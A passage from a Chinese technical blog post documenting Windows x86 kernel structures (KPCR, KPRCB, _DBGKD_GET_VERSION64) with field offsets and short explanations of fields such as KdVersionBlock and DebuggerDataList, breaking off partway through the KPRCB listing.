class_\">_EXCEPTION_REGISTRATION_RECORD</span>* Used_ExceptionList;      <span class=\"comment\">//0x0</span></span><br><span class=\"line\">            VOID* Used_StackBase;                                           <span class=\"comment\">//0x4</span></span><br><span class=\"line\">            VOID* Spare2;                                                   <span class=\"comment\">//0x8</span></span><br><span class=\"line\">            VOID* TssCopy;                                                  <span class=\"comment\">//0xc</span></span><br><span class=\"line\">            ULONG ContextSwitches;                                          <span class=\"comment\">//0x10</span></span><br><span class=\"line\">            ULONG SetMemberCopy;                                            <span class=\"comment\">//0x14</span></span><br><span class=\"line\">            VOID* Used_Self;                                                <span class=\"comment\">//0x18</span></span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_KPCR</span>* SelfPcr;                                                  <span class=\"comment\">//0x1c</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_KPRCB</span>* Prcb;                                                    <span class=\"comment\">//0x20</span></span><br><span class=\"line\">    UCHAR Irql;                                                             <span class=\"comment\">//0x24</span></span><br><span class=\"line\">    ULONG IRR;                                                              <span class=\"comment\">//0x28</span></span><br><span class=\"line\">    ULONG IrrActive;                                                        <span class=\"comment\">//0x2c</span></span><br><span class=\"line\">    ULONG IDR;                                                              <span class=\"comment\">//0x30</span></span><br><span class=\"line\">    VOID* KdVersionBlock;                                                   <span class=\"comment\">//0x34</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_KIDTENTRY</span>* IDT;                                                 <span class=\"comment\">//0x38</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_KGDTENTRY</span>* GDT;                                                 <span class=\"comment\">//0x3c</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_KTSS</span>* TSS;                                                      <span class=\"comment\">//0x40</span></span><br><span class=\"line\">    USHORT MajorVersion;                                                    <span class=\"comment\">//0x44</span></span><br><span class=\"line\">    USHORT MinorVersion;                                                    <span class=\"comment\">//0x46</span></span><br><span class=\"line\">    ULONG SetMember;                                                        <span class=\"comment\">//0x48</span></span><br><span class=\"line\">    ULONG StallScaleFactor;                                                 <span class=\"comment\">//0x4c</span></span><br><span class=\"line\">    UCHAR SpareUnused;                                                      <span class=\"comment\">//0x50</span></span><br><span class=\"line\">    UCHAR Number;                                                           <span class=\"comment\">//0x51</span></span><br><span class=\"line\">    UCHAR Spare0;                                                           <span class=\"comment\">//0x52</span></span><br><span class=\"line\">    UCHAR SecondLevelCacheAssociativity;                                    <span class=\"comment\">//0x53</span></span><br><span class=\"line\">    ULONG VdmAlert;                                                         <span class=\"comment\">//0x54</span></span><br><span class=\"line\">    ULONG KernelReserved[<span class=\"number\">14</span>];                                               <span class=\"comment\">//0x58</span></span><br><span class=\"line\">    ULONG SecondLevelCacheSize;                                             <span class=\"comment\">//0x90</span></span><br><span class=\"line\">    ULONG HalReserved[<span class=\"number\">16</span>];                                                  <span class=\"comment\">//0x94</span></span><br><span class=\"line\">    ULONG InterruptMode;                                                    <span class=\"comment\">//0xd4</span></span><br><span class=\"line\">    UCHAR Spare1;                                                           <span class=\"comment\">//0xd8</span></span><br><span class=\"line\">    ULONG KernelReserved2[<span class=\"number\">17</span>];                                              <span class=\"comment\">//0xdc</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_KPRCB</span> PrcbData;                                                 <span class=\"comment\">//0x120</span></span><br><span class=\"line\">&#125;; </span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><p>NtTib：</p>\n<ul>\n<li>Used_ExceptionList：异常处理程序链表。</li>\n<li>Used_StackBase：当前线程的栈底。</li>\n<li>Spare2&#x2F;StackLimit：当前线程的堆栈大小。</li>\n<li>Used_Self：指向NtTib自身，也是KPCR自身（fs:[0x18]）。</li>\n</ul>\n</li>\n<li><p>TssCopy：0x40处TSS的初始值。</p>\n</li>\n<li><p>SelfPcr：指向KPCR自身。与UsedSelf不同，SelfPcr必然指向KPCR自身，UsedSelf有时候会指向TEB。</p>\n</li>\n<li><p>Prcb：KPRCB结构指针，实际上指向的是0x120的PrcbData。</p>\n</li>\n<li><p>KdVersionBlock：只有第一个核有值，其他核为0；</p>\n<p><img src=\"/../images/Window-Kernel/x86%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/image-20230614011025900.png\" alt=\"image-20230614011025900\"></p>\n<p><img src=\"/../images/Window-Kernel/x86%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/image-20230614011102894.png\" alt=\"image-20230614011102894\"></p>\n<p>并且这个位置的值大有用处！！！！这个KdVersionBlock对应的结构为<code>_DBGKD_GET_VERSION64</code></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//0x28 bytes (sizeof)</span></span><br><span class=\"line\"><span class=\"keyword\">struct</span> <span class=\"title class_\">_DBGKD_GET_VERSION64</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    USHORT MajorVersion;                                                    <span class=\"comment\">//0x0</span></span><br><span class=\"line\">    USHORT MinorVersion;                                                    <span class=\"comment\">//0x2</span></span><br><span class=\"line\">    UCHAR ProtocolVersion;                                                  <span class=\"comment\">//0x4</span></span><br><span class=\"line\">    UCHAR KdSecondaryVersion;                                               <span class=\"comment\">//0x5</span></span><br><span class=\"line\">    USHORT Flags;                                                           <span class=\"comment\">//0x6</span></span><br><span class=\"line\">    USHORT MachineType;                                                     <span class=\"comment\">//0x8</span></span><br><span class=\"line\">    UCHAR MaxPacketType;                                                    <span class=\"comment\">//0xa</span></span><br><span class=\"line\">    UCHAR MaxStateChange;                                                   <span class=\"comment\">//0xb</span></span><br><span class=\"line\">    UCHAR MaxManipulate;                                                    <span class=\"comment\">//0xc</span></span><br><span class=\"line\">    UCHAR Simulation;                                                       <span class=\"comment\">//0xd</span></span><br><span class=\"line\">    USHORT Unused[<span class=\"number\">1</span>];                                                       <span class=\"comment\">//0xe</span></span><br><span class=\"line\">    ULONGLONG KernBase;                                                     <span class=\"comment\">//0x10</span></span><br><span class=\"line\">    ULONGLONG PsLoadedModuleList;                                           <span class=\"comment\">//0x18</span></span><br><span class=\"line\">    ULONGLONG DebuggerDataList;                                             <span class=\"comment\">//0x20</span></span><br><span class=\"line\">&#125;; </span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/../images/Window-Kernel/x86%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/image-20230614011455243.png\" alt=\"image-20230614011455243\"></p>\n<ul>\n<li>KernBase：ntoskrnl.exe的基地址</li>\n<li>PsLoadedModuleList：模块链表。</li>\n<li>DebuggerDataList：最牛逼的东西，里边存着很多公开&#x2F;未公开的内容。使用<code>dds</code>查看。</li>\n</ul>\n<p><img src=\"/../images/Window-Kernel/x86%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/image-20230614011631290.png\" alt=\"image-20230614011631290\"></p>\n<p>可以看到里边有很多东西，比如句柄表<code>PspCidTable</code>,对于他的这个结构在WRK有给出部分(由于系统一直在更新，所以内容也一直在添加)。<code>_KDDEBUGGER_DATA64</code></p>\n<p><img src=\"/../images/Window-Kernel/x86%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/image-20230614011853388.png\" alt=\"image-20230614011853388\"></p>\n<p><img src=\"/../images/Window-Kernel/x86%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/image-20230614011901258.png\" alt=\"image-20230614011901258\"></p>\n</li>\n<li><p>IDT：当前线程的IDT表地址。</p>\n</li>\n<li><p>GDT：当前线程的GDT表地址。</p>\n</li>\n<li><p>TSS：指向当前线程的TSS表。</p>\n</li>\n<li><p>SetNumber：当前CPU编号。从1开始。</p>\n</li>\n<li><p>Number：当前CPU编号。从0开始。</p>\n</li>\n<li><p>PrcbData：KPRCB结构，扩展结构，见后文。</p>\n</li>\n</ul>\n<h2 id=\"3-1-KPRCB\"><a href=\"#3-1-KPRCB\" class=\"headerlink\" title=\"3.1 KPRCB\"></a>3.1 KPRCB</h2><p>内核进程控制区域块。内核变量<code>KiProcessorBlock</code>中保存了KPRCB的地址。</p>\n<p><img src=\"/../images/Window-Kernel/x86%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/image-20230613123642965.png\" alt=\"image-20230613123642965\"></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//0x3628 bytes (sizeof)</span></span><br><span class=\"line\"><span class=\"keyword\">struct</span> <span class=\"title class_\">_KPRCB</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    USHORT MinorVersion;                                                    <span class=\"comment\">//0x0</span></span><br><span class=\"line\">    USHORT MajorVersion;                                                    <span class=\"comment\">//0x2</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_KTHREAD</span>* CurrentThread;                                         <span class=\"comment\">//0x4</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_KTHREAD</span>* NextThread;                                            <span class=\"comment\">//0x8</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_KTHREAD</span>* IdleThread;                                            <span class=\"comment\">//0xc</span></span><br><span class=\"line\">    UCHAR LegacyNumber;                                                     <span class=\"comment\">//0x10</span></span><br><span class=\"line\">    UCHAR NestingLevel;                                                     <span class=\"comment\">//0x11</span></span><br><span class=\"line\">    USHORT BuildType;                                                       <span class=\"comment\">//0x12</span></span><br><span class=\"line\">    CHAR CpuType;                                                           <span class=\"comment\">//0x14</span></span><br><span class=\"line\">    CHAR CpuID;                                                             <span class=\"comment\">//0x15</span></span><br><span class=\"line\">    <span class=\"keyword\">union</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        USHORT CpuStep;                                                     <span class=\"comment\">//0x16</span></span><br><span class=\"line\">        <span class=\"keyword\">struct</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            UCHAR CpuStepping;                                              <span class=\"comment\">//0x16</span></span><br><span class=\"line\">            UCHAR CpuModel;                                                 <span class=\"comment\">//0x17</span></span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_KPROCESSOR_STATE</span> ProcessorState;                                <span class=\"comment\">//0x18</span></span><br><span class=\"line\">    ULONG KernelReserved[<span class=\"number\">16</span>];                                               <span class=\"comment\">//0x338</span></span><br><span class=\"line\">    ULONG HalReserved[<span class=\"number\">16</span>];                                                  <span class=\"comment\">//0x378</span></span><br><span class=\"line\">    ULONG CFlushSize;                                                       <span class=\"comment\">//0x3b8</span></span><br><span class=\"line\">    UCHAR CoresPerPhysicalProcessor;                                        <span class=\"comment\">//0x3bc</span></span><br><span class=\"line\">    UCHAR LogicalProcessorsPerCore;                                         <span class=\"comment\">//0x3bd</span></span><br><span class=\"line\">    UCHAR PrcbPad0[<span class=\"number\">2</span>];                                                      <span class=\"comment\">//0x3be</span></span><br><span class=\"line\">    ULONG MHz;                                                              <span class=\"comment\">//0x3c0</span></span><br><span class=\"line\">    UCHAR CpuVendor;                                                        <span class=\"comment\">//0x3c4</span></span><br><span class=\"line\">    UCHAR GroupIndex;                                                       <span class=\"comment\">//0x3c5</span></span><br><span class=\"line\">    USHORT Group;                                                           <span class=\"comment\">//0x3c6</span></span><br><span class=\"line\">    ULONG GroupSetMember;                                                   <span class=\"comment\">//0x3c8</span></span><br><span class=\"line\">    ULONG Number;                                                           <span class=\"comment\">//0x3cc</span></span><br><span class=\"line\">    UCHAR PrcbPad1[<span class=\"number\">72</span>];                                                     <span class=\"comment\">//0x3d0</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_KSPIN_LOCK_QUEUE</span> LockQueue[<span class=\"number\">17</span>];                                 <span class=\"comment\">//0x418</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_KTHREAD</span>* NpxThread;                                             <span class=\"comment\">//0x4a0</span></span><br><span class=\"line\">    ULONG InterruptCount;                                                   <span class=\"comment\">//0x4a4</span></span><br><span class=\"line\">    ULONG KernelTime;                                                       <span class=\"comment\">//0x4a8</span></span><br><span class=\"line\">    ULONG UserTime;                                                         <span class=\"comment\">//0x4ac</span></span><br><span class=\"line\">    ULONG DpcTime;                                                          <span class=\"comment\">//0x4b0</span></span><br><span class=\"line\">    ULONG DpcTimeCount;                                                     <span class=\"comment\">//0x4b4</span></span><br><span class=\"line\">    ULONG InterruptTime;                                                    <span class=\"comment\">//0x4b8</span></span><br><span class=\"line\">    ULONG AdjustDpcThreshold;                                               <span class=\"comment\">//0x4bc</span></span><br><span class=\"line\">    ULONG PageColor;                                                        <span class=\"comment\">//0x4c0</span></span><br><span class=\"line\">    UCHAR DebuggerSavedIRQL;                                                <span class=\"comment\">//0x4c4</span></span><br><span class=\"line\">    UCHAR NodeColor;                                                        <span class=\"comment\">//0x4c5</span></span><br><span class=\"line\">    UCHAR PrcbPad20[<span class=\"number\">2</span>];                                                     <span class=\"comment\">//0x4c6</span></span><br><span class=\"line\">    ULONG NodeShiftedColor;                                                 <span class=\"comment\">//0x4c8</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_KNODE</span>* ParentNode;                                              <span class=\"comment\">//0x4cc</span></span><br><span class=\"line\">    ULONG SecondaryColorMask;                                               <span class=\"comment\">//0x4d0</span></span><br><span class=\"line\">    ULONG DpcTimeLimit;                                                     <span class=\"comment\">//0x4d4</span></span><br><span class=\"line\">    ULONG PrcbPad21[<span class=\"number\">2</span>];                                                     <span class=\"comment\">//0x4d8</span></span><br><span class=\"line\">    ULONG CcFastReadNoWait;                                                 <span class=\"comment\">//0x4e0</span></span><br><span class=\"line\">    ULONG CcFastReadWait;                                                   <span class=\"comment\">//0x4e4</span></span><br><span class=\"line\">    ULONG CcFastReadNotPossible;                                            <span class=\"comment\">//0x4e8</span></span><br><span class=\"line\">    ULONG CcCopyReadNoWait;                                                 <span class=\"comment\">//0x4ec</span></span><br><span class=\"line\">    ULONG CcCopyReadWait;                                                   <span class=\"comment\">//0x4f0</span></span><br><span class=\"line\">    ULONG CcCopyReadNoWaitMiss;                                             <span class=\"comment\">//0x4f4</span></span><br><span class=\"line\">    <span class=\"keyword\">volatile</span> LONG MmSpinLockOrdering;                                       <span class=\"comment\">//0x4f8</span></span><br><span class=\"line\">    <span class=\"keyword\">volatile</span> LONG IoReadOperationCount;                                     <span class=\"comment\">//0x4fc</span></span><br><span class=\"line\">    <span class=\"keyword\">volatile</span> LONG IoWriteOperationCount;                                    <span class=\"comment\">//0x500</span></span><br><span class=\"line\">    <span class=\"keyword\">volatile</span> LONG IoOtherOperationCount;                                    <span class=\"comment\">//0x504</span></span><br><span class=\"line\">    <span class=\"keyword\">union</span> <span class=\"title class_\">_LARGE_INTEGER</span> IoReadTransferCount;                               <span class=\"comment\">//0x508</span></span><br><span class=\"line\">    <span class=\"keyword\">union</span> <span class=\"title class_\">_LARGE_INTEGER</span> IoWriteTransferCount;                              <span class=\"comment\">//0x510</span></span><br><span class=\"line\">    <span class=\"keyword\">union</span> <span class=\"title class_\">_LARGE_INTEGER</span> IoOtherTransferCount;                              <span class=\"comment\">//0x518</span></span><br><span class=\"line\">    ULONG CcFastMdlReadNoWait;                                              <span class=\"comment\">//0x520</span></span><br><span class=\"line\">    ULONG CcFastMdlReadWait;                                                <span class=\"comment\">//0x524</span></span><br><span class=\"line\">    ULONG CcFastMdlReadNotPossible;                                         <span class=\"comment\">//0x528</span></span><br><span class=\"line\">    ULONG CcMapDataNoWait;                                                  <span class=\"comment\">//0x52c</span></span><br><span class=\"line\">    ULONG CcMapDataWait;                                                    <span class=\"comment\">//0x530</span></span><br><span class=\"line\">    ULONG CcPinMappedDataCount;                                             <span class=\"comment\">//0x534</span></span><br><span class=\"line\">    ULONG CcPinReadNoWait;                                                  <span class=\"comment\">//0x538</span></span><br><span class=\"line\">    ULONG CcPinReadWait;                                                    <span class=\"comment\">//0x53c</span></span><br><span class=\"line\">    ULONG CcMdlReadNoWait;                                                  <span class=\"comment\">//0x540</span></span><br><span class=\"line\">    ULONG CcMdlReadWait;                                                    <span class=\"comment\">//0x544</span></span><br><span class=\"line\">    ULONG CcLazyWriteHotSpots;                                              <span class=\"comment\">//0x548</span></span><br><span class=\"line\">    ULONG CcLazyWriteIos;                                                   <span class=\"comment\">//0x54c</span></span><br><span class=\"line\">    ULONG CcLazyWritePages;                                                 <span class=\"comment\">//0x550</span></span><br><span class=\"line\">    ULONG CcDataFlushes;                                                    <span class=\"comment\">//0x554</span></span><br><span class=\"line\">    ULONG CcDataPages;                                                      <span class=\"comment\">//0x558</span></span><br><span class=\"line\">    ULONG CcLostDelayedWrites;                                              <span class=\"comment\">//0x55c</span></span><br><span class=\"line\">    ULONG CcFastReadResourceMiss;                                           <span class=\"comment\">//0x560</span></span><br><span class=\"line\">    ULONG CcCopyReadWaitMiss;                                               <span class=\"comment\">//0x564</span></span><br><span class=\"line\">    ULONG CcFastMdlReadResourceMiss;                                        <span class=\"comment\">//0x568</span></span><br><span class=\"line\">    ULONG CcMapDataNoWaitMiss;                                              <span class=\"comment\">//0x56c</span></span><br><span class=\"line\">    ULONG CcMapDataWaitMiss;                                                <span class=\"comment\">//0x570</span></span><br><span class=\"line\">    ULONG CcPinReadNoWaitMiss;                                              <span class=\"comment\">//0x574</span></span><br><span class=\"line\">    ULONG CcPinReadWaitMiss;                                                <span class=\"comment\">//0x578</span></span><br><span class=\"line\">    ULONG CcMdlReadNoWaitMiss;                                              <span class=\"comment\">//0x57c</span></span><br><span class=\"line\">    ULONG CcMdlReadWaitMiss;                                                <span class=\"comment\">//0x580</span></span><br><span class=\"line\">    ULONG CcReadAheadIos;                                                   <span class=\"comment\">//0x584</span></span><br><span class=\"line\">    ULONG KeAlignmentFixupCount;                                            <span class=\"comment\">//0x588</span></span><br><span class=\"line\">    ULONG KeExceptionDispatchCount;                                         <span class=\"comment\">//0x58c</span></span><br><span class=\"line\">    ULONG KeSystemCalls;                                                    <span class=\"comment\">//0x590</span></span><br><span class=\"line\">    ULONG AvailableTime;                                                    <span class=\"comment\">//0x594</span></span><br><span class=\"line\">    ULONG PrcbPad22[<span class=\"number\">2</span>];                                                     <span class=\"comment\">//0x598</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_PP_LOOKASIDE_LIST</span> PPLookasideList[<span class=\"number\">16</span>];                          <span class=\"comment\">//0x5a0</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_GENERAL_LOOKASIDE_POOL</span> PPNPagedLookasideList[<span class=\"number\">32</span>];               <span class=\"comment\">//0x620</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_GENERAL_LOOKASIDE_POOL</span> PPPagedLookasideList[<span class=\"number\">32</span>];                <span class=\"comment\">//0xf20</span></span><br><span class=\"line\">    <span class=\"keyword\">volatile</span> ULONG PacketBarrier;                                           <span class=\"comment\">//0x1820</span></span><br><span class=\"line\">    <span class=\"keyword\">volatile</span> LONG ReverseStall;                                             <span class=\"comment\">//0x1824</span></span><br><span class=\"line\">    VOID* IpiFrame;                                                         <span class=\"comment\">//0x1828</span></span><br><span class=\"line\">    UCHAR PrcbPad3[<span class=\"number\">52</span>];                                                     <span class=\"comment\">//0x182c</span></span><br><span class=\"line\">    VOID* <span class=\"keyword\">volatile</span> CurrentPacket[<span class=\"number\">3</span>];                                        <span class=\"comment\">//0x1860</span></span><br><span class=\"line\">    <span class=\"keyword\">volatile</span> ULONG TargetSet;                                               <span class=\"comment\">//0x186c</span></span><br><span class=\"line\">    <span class=\"built_in\">VOID</span> (* volatileWorkerRoutine)(VOID* arg1, VOID* arg2, VOID* arg3, VOID* arg4); <span class=\"comment\">//0x1870</span></span><br><span class=\"line\">    <span class=\"keyword\">volatile</span> ULONG IpiFrozen;                                               <span class=\"comment\">//0x1874</span></span><br><span class=\"line\">    UCHAR PrcbPad4[<span class=\"number\">40</span>];                                                     <span class=\"comment\">//0x1878</span></span><br><span class=\"line\">    <span class=\"keyword\">volatile</span> ULONG RequestSummary;                                          <span class=\"comment\">//0x18a0</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_KPRCB</span>* <span class=\"keyword\">volatile</span> SignalDone;                                     <span class=\"comment\">//0x18a4</span></span><br><span class=\"line\">    UCHAR PrcbPad50[<span class=\"number\">56</span>];                                                    <span class=\"comment\">//0x18a8</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_KDPC_DATA</span> DpcData[<span class=\"number\">2</span>];                                           <span class=\"comment\">//0x18e0</span></span><br><span class=\"line\">    VOID* DpcStack;                                                         <span class=\"comment\">//0x1908</span></span><br><span class=\"line\">    LONG MaximumDpcQueueDepth;                                              <span class=\"comment\">//0x190c</span></span><br><span class=\"line\">    ULONG DpcRequestRate;                                                   <span class=\"comment\">//0x1910</span></span><br><span class=\"line\">    ULONG MinimumDpcRate;                                                   <span class=\"comment\">//0x1914</span></span><br><span class=\"line\">    ULONG DpcLastCount;                                                     <span class=\"comment\">//0x1918</span></span><br><span class=\"line\">    ULONG PrcbLock;                                                         <span class=\"comment\">//0x191c</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_KGATE</span> DpcGate;                                                  <span class=\"comment\">//0x1920</span></span><br><span class=\"line\">    UCHAR ThreadDpcEnable;                                                  <span class=\"comment\">//0x1930</span></span><br><span class=\"line\">    <span class=\"keyword\">volatile</span> UCHAR QuantumEnd;                                              <span class=\"comment\">//0x1931</span></span><br><span class=\"line\">    <span class=\"keyword\">volatile</span> UCHAR DpcRoutineActive;                                        <span class=\"comment\">//0x1932</span></span><br><span class=\"line\">    <span class=\"keyword\">volatile</span> UCHAR IdleSchedule;                                            <span class=\"comment\">//0x1933</span></span><br><span class=\"line\">    <span class=\"keyword\">union</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">volatile</span> LONG DpcRequestSummary;                                    <span class=\"comment\">//0x1934</span></span><br><span class=\"line\">        SHORT DpcRequestSlot[<span class=\"number\">2</span>];                                            <span class=\"comment\">//0x1934</span></span><br><span class=\"line\">        <span class=\"keyword\">struct</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            SHORT NormalDpcState;                                           <span class=\"comment\">//0x1934</span></span><br><span class=\"line\">            <span class=\"keyword\">union</span></span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                <span class=\"keyword\">volatile</span> USHORT DpcThreadActive:<span class=\"number\">1</span>;                          <span class=\"comment\">//0x1936</span></span><br><span class=\"line\">                SHORT ThreadDpcState;                                       <span class=\"comment\">//0x1936</span></span><br><span class=\"line\">            &#125;;</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    <span class=\"keyword\">volatile</span> ULONG TimerHand;                                               <span class=\"comment\">//0x1938</span></span><br><span class=\"line\">    ULONG LastTick;                                                         <span class=\"comment\">//0x193c</span></span><br><span class=\"line\">    LONG MasterOffset;                                                      <span class=\"comment\">//0x1940</span></span><br><span class=\"line\">    ULONG PrcbPad41[<span class=\"number\">2</span>];                                                     <span class=\"comment\">//0x1944</span></span><br><span class=\"line\">    ULONG PeriodicCount;                                                    <span class=\"comment\">//0x194c</span></span><br><span class=\"line\">    ULONG PeriodicBias;                                                     <span class=\"comment\">//0x1950</span></span><br><span class=\"line\">    ULONGLONG TickOffset;                                                   <span class=\"comment\">//0x1958</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_KTIMER_TABLE</span> TimerTable;                                        <span class=\"comment\">//0x1960</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_KDPC</span> CallDpc;                                                   <span class=\"comment\">//0x31a0</span></span><br><span class=\"line\">    LONG ClockKeepAlive;                                                    <span class=\"comment\">//0x31c0</span></span><br><span class=\"line\">    UCHAR ClockCheckSlot;                                                   <span class=\"comment\">//0x31c4</span></span><br><span class=\"line\">    UCHAR ClockPollCycle;                                                   <span class=\"comment\">//0x31c5</span></span><br><span class=\"line\">    UCHAR PrcbPad6[<span class=\"number\">2</span>];                                                      <span class=\"comment\">//0x31c6</span></span><br><span class=\"line\">    LONG DpcWatchdogPeriod;                                                 <span class=\"comment\">//0x31c8</span></span><br><span class=\"line\">    LONG DpcWatchdogCount;                                                  <span class=\"comment\">//0x31cc</span></span><br><span class=\"line\">    LONG ThreadWatchdogPeriod;                                              <span class=\"comment\">//0x31d0</span></span><br><span class=\"line\">    LONG ThreadWatchdogCount;                                               <span class=\"comment\">//0x31d4</span></span><br><span class=\"line\">    <span class=\"keyword\">volatile</span> LONG KeSpinLockOrdering;                                       <span class=\"comment\">//0x31d8</span></span><br><span class=\"line\">    ULONG PrcbPad70[<span class=\"number\">1</span>];                                                     <span class=\"comment\">//0x31dc</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_LIST_ENTRY</span> WaitListHead;                                        <span class=\"comment\">//0x31e0</span></span><br><span class=\"line\">    ULONG WaitLock;                                                         <span class=\"comment\">//0x31e8</span></span><br><span class=\"line\">    ULONG ReadySummary;                                                     <span class=\"comment\">//0x31ec</span></span><br><span class=\"line\">    ULONG QueueIndex;                                                       <span class=\"comment\">//0x31f0</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_SINGLE_LIST_ENTRY</span> DeferredReadyListHead;                        <span class=\"comment\">//0x31f4</span></span><br><span class=\"line\">    ULONGLONG StartCycles;                                                  <span class=\"comment\">//0x31f8</span></span><br><span class=\"line\">    <span class=\"keyword\">volatile</span> ULONGLONG CycleTime;                                           <span class=\"comment\">//0x3200</span></span><br><span class=\"line\">    <span class=\"keyword\">volatile</span> ULONG HighCycleTime;                                           <span class=\"comment\">//0x3208</span></span><br><span class=\"line\">    ULONG PrcbPad71;                                                        <span class=\"comment\">//0x320c</span></span><br><span class=\"line\">    ULONGLONG PrcbPad72[<span class=\"number\">2</span>];                                                 <span class=\"comment\">//0x3210</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_LIST_ENTRY</span> DispatcherReadyListHead[<span class=\"number\">32</span>];                         <span class=\"comment\">//0x3220</span></span><br><span class=\"line\">    VOID* ChainedInterruptList;                                             <span class=\"comment\">//0x3320</span></span><br><span class=\"line\">    LONG LookasideIrpFloat;                                                 <span class=\"comment\">//0x3324</span></span><br><span class=\"line\">    <span class=\"keyword\">volatile</span> LONG MmPageFaultCount;                                         <span class=\"comment\">//0x3328</span></span><br><span class=\"line\">    <span class=\"keyword\">volatile</span> LONG MmCopyOnWriteCount;                                       <span class=\"comment\">//0x332c</span></span><br><span class=\"line\">    <span class=\"keyword\">volatile</span> LONG MmTransitionCount;                                        <span class=\"comment\">//0x3330</span></span><br><span class=\"line\">    <span class=\"keyword\">volatile</span> LONG MmCacheTransitionCount;                                   <span class=\"comment\">//0x3334</span></span><br><span class=\"line\">    <span class=\"keyword\">volatile</span> LONG MmDemandZeroCount;                                        <span class=\"comment\">//0x3338</span></span><br><span class=\"line\">    <span class=\"keyword\">volatile</span> LONG MmPageReadCount;                                          <span class=\"comment\">//0x333c</span></span><br><span class=\"line\">    <span class=\"keyword\">volatile</span> LONG MmPageReadIoCount;                                        <span class=\"comment\">//0x3340</span></span><br><span class=\"line\">    <span class=\"keyword\">volatile</span> LONG MmCacheReadCount;                                         <span class=\"comment\">//0x3344</span></span><br><span class=\"line\">    <span class=\"keyword\">volatile</span> LONG MmCacheIoCount;                                           <span class=\"comment\">//0x3348</span></span><br><span class=\"line\">    <span class=\"keyword\">volatile</span> LONG MmDirtyPagesWriteCount;                                   <span class=\"comment\">//0x334c</span></span><br><span class=\"line\">    <span class=\"keyword\">volatile</span> LONG MmDirtyWriteIoCount;                                      <span class=\"comment\">//0x3350</span></span><br><span class=\"line\">    <span class=\"keyword\">volatile</span> LONG MmMappedPagesWriteCount;                                  <span class=\"comment\">//0x3354</span></span><br><span class=\"line\">    <span class=\"keyword\">volatile</span> LONG MmMappedWriteIoCount;                                     <span class=\"comment\">//0x3358</span></span><br><span class=\"line\">    <span class=\"keyword\">volatile</span> ULONG CachedCommit;                                            <span class=\"comment\">//0x335c</span></span><br><span class=\"line\">    <span class=\"keyword\">volatile</span> ULONG CachedResidentAvailable;                                 <span class=\"comment\">//0x3360</span></span><br><span class=\"line\">    VOID* HyperPte;                                                         <span class=\"comment\">//0x3364</span></span><br><span class=\"line\">    UCHAR PrcbPad8[<span class=\"number\">4</span>];                                                      <span class=\"comment\">//0x3368</span></span><br><span class=\"line\">    UCHAR VendorString[<span class=\"number\">13</span>];                                                 <span class=\"comment\">//0x336c</span></span><br><span class=\"line\">    UCHAR InitialApicId;                                                    <span class=\"comment\">//0x3379</span></span><br><span class=\"line\">    UCHAR LogicalProcessorsPerPhysicalProcessor;                            <span class=\"comment\">//0x337a</span></span><br><span class=\"line\">    UCHAR PrcbPad9[<span class=\"number\">5</span>];                                                      <span class=\"comment\">//0x337b</span></span><br><span class=\"line\">    ULONG FeatureBits;                                                      <span class=\"comment\">//0x3380</span></span><br><span class=\"line\">    <span class=\"keyword\">union</span> <span class=\"title class_\">_LARGE_INTEGER</span> UpdateSignature;                                   <span class=\"comment\">//0x3388</span></span><br><span class=\"line\">    <span class=\"keyword\">volatile</span> ULONGLONG IsrTime;                                             <span 